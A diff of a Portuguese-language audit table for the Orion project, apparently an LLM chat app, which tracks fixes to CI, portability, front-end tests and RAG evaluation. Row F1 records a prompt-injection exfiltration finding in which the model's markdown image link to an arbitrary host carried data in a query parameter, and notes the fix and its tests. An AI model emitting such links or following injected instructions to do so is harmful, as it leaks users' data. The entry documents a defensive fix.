@@ -23,7 +23,7 @@ Legenda: ✅ resolvido e testado · 🟡 parcial · ⏳ depende de você ou de f
 | E1 | Média | Sem CI nem testes unitários | ✅ | `.github/workflows/ci.yml` (Linux, Windows, macOS) + 270 testes Python + 18 em Node |
 | E2 | Média | Só Windows, caminhos `C:\Orion` fixos, `requirements` com pywin32/torch | 🟡 | Pacote novo é portável (`platformdirs`, caminhos por config). Legado segue Windows por desenho até a fase 7 |
 | E3 | Média | Globals, `ChatRouter` com 22 argumentos, `on_event` deprecado | ✅ (novo) | `create_app` com lifespan e `AppState` injetado |
-| E4 | Baixa | `script.js` monolítico, `innerHTML` sem teste | ✅ | Front redesenhado em módulos (03/10/2026): 6 puros testados em Node (79 testes) + 57 testes de navegador (fluxos, segurança, mobile, axe). Ver [ORION_FRONT.md](ORION_FRONT.md) |
+| E4 | Baixa | `script.js` monolítico, `innerHTML` sem teste | ✅ | Front redesenhado em módulos (03/10/2026): 7 puros testados em Node (89 testes) + 69 testes de navegador (fluxos, segurança, mobile, axe). Ver [ORION_FRONT.md](ORION_FRONT.md) |
 | E5 | Baixa | Drift de docs, `.gitignore`, `requirements` | 🟡 | Corrigidos. A pasta `Orion_Ollama/` **não** foi renomeada (o `.bat`, o boot e o README apontam para ela; sai na fase 7) |
 | E6 | Média | RAG sem avaliação (HR 10%, MRR 0.057) | ✅ | `orion.memory.eval` + conjunto fixo em pytest; CLI para as **suas** perguntas reais |
 | F1 | Média | *(achado durante a execução)* o chat renderizava `![x](https://host-qualquer/?d=…)` do modelo: exfiltração por prompt injection | ✅ | Só imagem de `/imagens/<arquivo>`; 18 testes em Node, com checagem de que falham no código antigo |
